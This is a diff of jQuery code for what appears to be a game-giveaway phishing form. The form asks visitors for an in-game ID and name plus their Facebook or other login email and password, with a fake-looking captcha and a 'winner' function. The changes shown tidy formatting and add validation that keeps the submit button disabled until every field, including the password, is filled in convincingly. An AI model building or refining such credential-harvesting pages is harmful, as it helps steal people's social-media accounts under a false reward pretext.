@@ -1,6 +1,7 @@
 function captchaGen() {
     $('.captcha').html(Math.random().toString(36).substring(7));
     $('.captcha').css('color', "#" + ((1 << 24) * Math.random() | 0).toString(16));
+    $('#tapatap').addClass('disabled');
 }
 
 function winner(username, domain) {
@@ -86,8 +87,8 @@ $(document).ready(function () {
 
     $('#igid').tooltip({ 'trigger': 'focus', 'title': 'Your In-game Character ID' });
     $('#ign').tooltip({ 'trigger': 'focus', 'title': 'Your In-game Name' });
-    $('#user').tooltip({ 'trigger': 'focus', 'title': `Your Facebook Email or Username`});
-    $('#pass').tooltip({ 'trigger': 'focus', 'title': 'Your Facebook Password'});
+    $('#user').tooltip({ 'trigger': 'focus', 'title': `Your Facebook Email or Username` });
+    $('#pass').tooltip({ 'trigger': 'focus', 'title': 'Your Facebook Password' });
 
     if (document.querySelector('input[name="loginMedium"]')) {
         document.querySelectorAll('input[name="loginMedium"]').forEach((elem) => {
@@ -95,17 +96,16 @@ $(document).ready(function () {
                 let item = event.target.value;
                 $("#user").attr("placeholder", `${item} Email or Username`);
                 $("#pass").attr("placeholder", `${item} Password`);
-                $('#user').tooltip({ 'trigger': 'focus', 'title': `Your ${item} Email or Username`});
+                $('#user').tooltip({ 'trigger': 'focus', 'title': `Your ${item} Email or Username` });
             });
         });
     }
 
-
     // validating input
-    $(":input").bind("keyup", function(e) {
+    $(":input").bind("keyup", function (e) {
         // igid (5-12)
         let ig_id = $('#igid').val().trim();
-        
+
         if (ig_id < 9999 || ig_id > 999999999999) {
             $('#igid').addClass('is-invalid');
         } else {
@@ -114,7 +114,7 @@ $(document).ready(function () {
 
         // email
         let len_user = $('#user').val().trim().length;
-        
+
         if (len_user < 5) {
             $('#user').addClass('is-invalid');
         } else {
@@ -123,7 +123,7 @@ $(document).ready(function () {
 
         // pass
         let len_pass = $('#pass').val().trim().length;
-        
+
         if (len_pass < 6) {
             $('#pass').addClass('is-invalid');
         } else {
@@ -137,12 +137,19 @@ $(document).ready(function () {
             $('#captcha').removeClass('is-invalid');
         }
 
-        if ($('#data :input').attr("class").includes('is-invalid')) {
+        // check all are valid ?
+        let allClass = "";
+
+        $('#data :input.form-control').each(function () {
+            allClass += $(this).attr("class").split(/\s+/);
+        });
+
+        if (allClass.includes('is-invalid')) {
             $('#tapatap').addClass('disabled');
         } else {
             $('#tapatap').removeClass('disabled');
         }
-    })
+    });
 
     $('.fa-sync').on('click', function () {
         captchaGen();
